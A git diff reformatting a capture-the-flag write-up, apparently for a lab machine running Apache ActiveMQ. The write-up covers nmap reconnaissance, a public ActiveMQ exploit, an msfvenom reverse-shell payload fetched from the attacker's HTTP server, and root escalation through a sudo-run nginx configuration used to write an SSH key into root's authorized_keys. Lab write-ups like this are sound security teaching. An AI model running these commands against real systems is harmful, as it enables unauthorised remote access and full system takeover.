@@ -6,7 +6,9 @@ pagination_prev: null
 
 ## Reconnaissance
 ### Nmap scan
-- Let's begin by running a simple `nmap` scan against the target machine.
+
+Let's begin by running a simple `nmap` scan against the target machine.
+
 ```
 $ nmap -p- 10.10.11.243 -T4
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-10 18:26 IST
@@ -29,7 +31,9 @@ PORT      STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 734.50 seconds
 ```
-- We can now run an in-depth scan on only the ports that are open.
+
+We can now run an in-depth scan on only the ports that are open.
+
 ```
 $ nmap -p 22,80,443,1337,1883,5672,7777,8161,43935,61613,61614,61616 -A 10.10.11.243   
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-10 18:57 IST
@@ -144,25 +148,33 @@ PORT      STATE SERVICE    VERSION
 
 Nmap done: 1 IP address (1 host up) scanned in 46.18 seconds
 ```
-- We can see that the ActiveMQ service is runnig on port `61616`.
-- Let's visit the machine on port `61616` through our browser.
+
+We can see that the ActiveMQ service is runnig on port `61616`.
+
+Let's visit the machine on port `61616` through our browser.
 
 ![2](https://github.com/Knign/Write-ups/assets/110326359/07fb3ab7-956d-40d7-9cb2-d4a7412181b0)
 
+## Exploitation
+
 ### Vulnerability
-- Let's check if this version has any vulnerabilities.
+
+Let's check if this version has any vulnerabilities.
 
 ![3](https://github.com/Knign/Write-ups/assets/110326359/ac1ae3ec-675a-46d3-b0e2-946b77380900)
 
 ### Exploit
-- Looking for exploits, we can find the following one:
+
+Looking for exploits, we can find the following one:
 
 ![4](https://github.com/Knign/Write-ups/assets/110326359/52032efc-5f72-4945-a1fa-97f081fb9b5b)
 
 &nbsp;
 
-## Initial Access
-- We can now generate a reverse shell ELF file using `msfvenom`.
+### Initial Access
+
+We can now generate a reverse shell ELF file using `msfvenom`.
+
 ```
 $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.154 LPORT=9999 -f elf -o exploit.elf
 ```
@@ -184,7 +196,9 @@ $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.154 LPORT=9999 -f elf -
         </bean>
     </beans>
 ```
-- Next we have to spin up a `python3` server on port 8001 and a `nc` listener on port 9999.
+
+Next we have to spin up a `python3` server on port 8001 and a `nc` listener on port 9999.
+
 ```
 $ python3 -m http.server 8001
 Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
@@ -192,12 +206,17 @@ Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
 $ nc -nlvp 9999
 listening on [any] 9999 ...
 ```
-- This allows the POC to access the `exploit.elf` file on our machine.
-- Finally we have to run the `exploit.py` as follows:
+
+This allows the POC to access the `exploit.elf` file on our machine.
+
+Finally we have to run the `exploit.py` as follows:
+
 ```
 $ python3 exploit.py -i 10.10.11.243 -p 61616 -u http://10.10.14.154:8001/poc.xml
 ```
-- After a few seconds we can see the GET requests on the `python3` server.
+
+After a few seconds we can see the GET requests on the `python3` server.
+
 ```
 $ python3 -m http.server 8001
 Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
@@ -205,28 +224,37 @@ Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
 10.10.11.243 - - [10/Dec/2023 19:58:07] "GET /poc.xml HTTP/1.1" 200 -
 10.10.11.243 - - [10/Dec/2023 19:58:07] "GET /exploit.elf HTTP/1.1" 200 -
 ```
-- Let's check out our `nc` listener.
+
+Let's check out our `nc` listener.
+
 ```
 $ nc -nlvp 9999
 listening on [any] 9999 ...
 connect to [10.10.14.154] from (UNKNOWN) [10.10.11.243] 43728
 
 ```
-- We have our shell.
-- We can stabilize it using the following commands:
+
+We have our shell.
+
+We can stabilize it using the following commands:
+
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 CRTL+Z
 stty raw -echo; fg
 export TERM=xterm
 ```
-- Let's check our `id`.
+
+Let's check our `id`.
+
 ```
 activemq@broker:/opt/apache-activemq-5.15.15/bin$ id
 uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
 ```
+
 ### User flag
-- We can now `cat` out the user flag.
+
+We can now `cat` out the user flag.
 ```
 activemq@broker:/opt/apache-activemq-5.15.15/bin$ cat /home/activemq/user.txt
 75589562fe900bf4de17fbaf4d55afb3
@@ -234,8 +262,12 @@ activemq@broker:/opt/apache-activemq-5.15.15/bin$ cat /home/activemq/user.txt
 
 &nbsp;
 
-## Privilege Escalation
-- We can check out the binaries that the `activemq` user can run as `sudo` using the following command:
+## Post Exploitation
+
+### Privilege escalation
+
+We can check out the binaries that the `activemq` user can run as `sudo` using the following command:
+
 ```
 activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo -l
 Matching Defaults entries for activemq on broker:
@@ -246,7 +278,9 @@ Matching Defaults entries for activemq on broker:
 User activemq may run the following commands on broker:
     (ALL : ALL) NOPASSWD: /usr/sbin/nginx
 ```
-- Let's build a new `.conf` file for the NGINX server.
+
+Let's build a new `.conf` file for the NGINX server.
+
 ```nginx title="/tmp/privesc.conf"
 user root;
 worker_processes 4;
@@ -263,7 +297,9 @@ http {
 	}
 }
 ```
-- We can set a custom `nginx` configuration by specifying the file we created using the `-c` flag.
+
+We can set a custom `nginx` configuration by specifying the file we created using the `-c` flag.
+
 ```
 activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo nginx -c /tmp/privesc.conf
 nginx: [emerg] bind() to 0.0.0.0:1337 failed (98: Unknown error)
@@ -290,7 +326,9 @@ LISTEN 0      128             [::]:22            [::]:*
 LISTEN 0      4096               *:1883             *:*    users:(("java",pid=947,fd=146))
 LISTEN 0      50                 *:8161             *:*    users:(("java",pid=947,fd=154))
 ```
-- Let's generate an SSH key on our attacker machine.
+
+Let's generate an SSH key on our attacker machine.
+
 ```
 $ ssh-keygen -f broker
 Generating public/private rsa key pair.
@@ -313,7 +351,9 @@ The key's randomart image is:
 |     .B==++.     |
 +----[SHA256]-----+
 ```
-- We can now upload this key to the target machine using the following command:
+
+We can now upload this key to the target machine using the following command:
+
 ```
 $ curl 10.10.11.243:1337/root/.ssh/authorized_keys --upload-file broker
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -327,7 +367,9 @@ $ curl 10.10.11.243:1337/root/.ssh/authorized_keys --upload-file broker
 </html>
   6  2756  100   166    0     0    553      0 --:--:-- --:--:-- --:--:--   594
 ```
-- Now we are all set to login as the `root` user, 
+
+Now we are all set to login as the `root` user, 
+
 ```
 $ ssh -i broker root@10.10.11.243
 The authenticity of host '10.10.11.243 (10.10.11.243)' can't be established.
@@ -369,8 +411,11 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 Last login: Wed Dec 20 05:46:42 2023 from 10.10.14.38
 root@broker:~# 
 ```
+
 ### Root flag
-- Let's get the root flag.
+
+Let's get the root flag.
+
 ```
 root@broker:~# cat /root/root.txt
 5a0ddd1174678ff246d93285c421e95f
